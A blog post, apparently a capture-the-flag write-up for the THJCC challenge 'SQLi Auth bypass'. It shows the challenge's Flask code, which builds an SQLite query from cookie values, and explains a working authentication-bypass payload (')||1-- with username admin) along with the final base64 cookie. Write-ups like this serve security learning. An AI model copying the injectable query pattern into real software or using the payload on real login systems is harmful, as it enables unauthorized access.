---
layout: post
title:  "[THJCC]SQLi Auth bypass"
date:   2024-04-29 00:29:20 +0700
categories: ctfwriteup
---

### Challenge Name : SQLi Auth bypass 

<img>

• I played this THJCC CTF last weekend and thought of making a writeup for this SQLI challenge,since i been solving quite a lot of SQLI challenges recently.

• Source code for the challenge has been given and inspecting the auth.py

```
from flask import make_response, redirect
import base64, re, sqlite3, string

# Cookie & Auth
def auth(content):
    try:
        username, password = base64.b64decode(content.encode()).decode(encoding="utf8").split("@")
        # 去除所有空格
        username = "".join(username.split())
        password = "".join(password.split())

        # 過濾username中所有特殊字符
        mu = re.match(r'.*\W', username)
        if mu is None: 
            # 過濾password中所有英文字母跟等號
            cflag = False
            for w in password: 
                if (w in string.ascii_letters) or (w == "="): cflag = True
            if (cflag): return None
            else:
                conn = sqlite3.connect("user.db")
                rows = conn.execute(f"select * from user where (user='{username}') and (pass='{password}');")
                result = None
                for row in rows: result = tuple(row)
                conn.close()

                if result is None: 
                    return None
                else: 
                    return str(result[0])
        else: return None
    except: return None 
def guestGive():
    res = make_response(redirect("/"))
    res.set_cookie("role", base64.b64encode("guest@?*&*@&*#&".encode()).decode(encoding="utf8"))
    return res
```

• It sets the cookie value as guest@somespcialchars and the first value is treated as username and second value treated as password and passed to the SQL query `conn.execute(f"select * from user where (user='{username}') and (pass='{password}');")`,
If the username and password is valid,then it responds with a main.html.

```
#main.py
from flask import Flask, request, redirect, render_template
from auth import *

# Main
PORT = 10010

FLAG = "THJCC{exampleFlag}"

app = Flask(__name__)

# Routes
@app.route("/")
def index():
    cookie = request.cookies.get("role")
    if cookie is None: return guestGive()
    else:
        authCookie = auth(cookie)
        if authCookie is None: return guestGive()
        elif authCookie == "guest" or authCookie == "admin": return redirect("/flag")
        else: return guestGive()

@app.route("/flag", methods = ['GET', "POST"])
def profile():
    cookie = request.cookies.get("role")
    if cookie is None: return redirect("/")
    else:
        authCookie = auth(cookie)
        if authCookie is None: return redirect("/")
        elif authCookie == "guest": return render_template("main.html")
        elif authCookie == "admin": return FLAG + "<img src=\"https://media1.tenor.com/m/wm_jigc51u8AAAAC/fubuki-%E7%99%BD%E4%B8%8A%E3%83%95%E3%83%96%E3%82%AD.gif\" style=\"width: 100%;\" /><title>Flag</title>"
        else: return redirect("/")

if __name__ == "__main__": app.run("0.0.0.0", PORT, debug=False)
```

• We need to auth bypass as the admin to get the flag but we dont have admin password, all we know is we have SQL injection on username and password field.

• We have restriction on username and password, we can only can have alphabet characters on the username and no specialcharacters likewise we can only have specialcharacters on password and no alphabets.

```
        if mu is None: 
            # 過濾password中所有英文字母跟等號
            cflag = False
            for w in password: 
                if (w in string.ascii_letters) or (w == "="): cflag = True
            if (cflag): return None
```

• We can bypass the password field by supplying <code>` ')||1-- `</code> and changing the username to admin.

Breakdown:

') - we are closing the password query properly
|| - using OR operator
1 - 1 which will always result in true
-- - commenting out the reamining query

• Final base64 cookie <code>`YWRtaW5APyomLTwvOzwkKX5+LyUuIX17L1wpeyV+OjwhKS0jJV0oXSQtJSh9XV1fJnwufV8tOyNgXjwmJSZdPmB+Kn4oXj4rLH0vIyomJjomfCN8JntdIy8jJV4uOyUtXiV9JF0pPFtcOil+Wz5cfnsjXlsvPztgI2ApKX1eXVwqO18vLDwnKXx8MS0t`</code>

<img>